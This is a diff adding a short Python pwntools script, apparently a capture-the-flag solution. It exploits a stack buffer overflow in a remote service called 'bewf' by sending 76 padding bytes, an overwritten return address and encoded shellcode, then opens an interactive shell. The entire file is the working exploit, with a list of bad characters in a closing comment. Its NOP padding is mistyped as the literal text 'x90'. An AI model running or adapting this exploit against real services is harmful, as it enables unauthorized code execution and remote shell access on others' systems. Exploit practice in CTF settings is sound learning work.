@@ -1,0 +1,30 @@
+#!/usr/bin/env python
+
+import sys
+from pwn import *
+
+url = sys.argv[1]
+port = sys.argv[2]
+
+io = remote (url, port)
+#io = process('./bewf')
+
+buf  = "\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+buf += "\x76\x0e\xf0\x59\xaa\xc0\x83\xee\xfc\xe2\xf4\x9a\x52"
+buf += "\xf2\x59\xa2\x3f\xc2\xed\x93\xd0\x4d\xa8\xdf\x2a\xc2"
+buf += "\xc0\x98\x76\xc8\xa9\x9e\xd0\x49\x92\x18\x51\xaa\xc0"
+buf += "\xf0\x76\xc8\xa9\x9e\x76\xd9\xa8\xf0\x0e\xf9\x49\x11"
+buf += "\x94\x2a\xc0"
+
+
+
+eip = p32(0x80e04eb)
+payload = "A"*76 + eip + buf + "x90" * 40
+
+io.sendlineafter("chood?\n", payload)
+#print io.recvline()
+
+io.interactive()
+
+# bad char
+# x00 x0b x0a x09 x0a x0c x0d x20
